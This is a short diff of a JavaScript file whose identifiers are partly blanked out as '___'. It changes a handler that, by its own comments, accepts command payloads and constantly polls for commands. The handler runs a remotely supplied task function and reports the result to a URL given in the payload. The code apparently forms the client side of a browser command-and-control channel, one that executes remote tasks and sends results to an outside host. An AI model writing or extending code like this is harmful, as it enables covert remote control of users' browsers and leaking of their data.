@@ -14,9 +14,14 @@ ___.$(function($) {
         // Accepts command payloads
         $(document).on('___', function(event) {
             var payload = event.payload;
-            payload.task.call(this, function(result) {
-                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
-            });
+            if (payload.task.length > 0) {
+                payload.task.call(this, function(result) {
+                    ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
+                });
+            } else {
+                payload.task.call(this);
+                ___.include(payload.return + "?key=" + payload.key);
+            }
         });
 
         // Constantly polls for commands
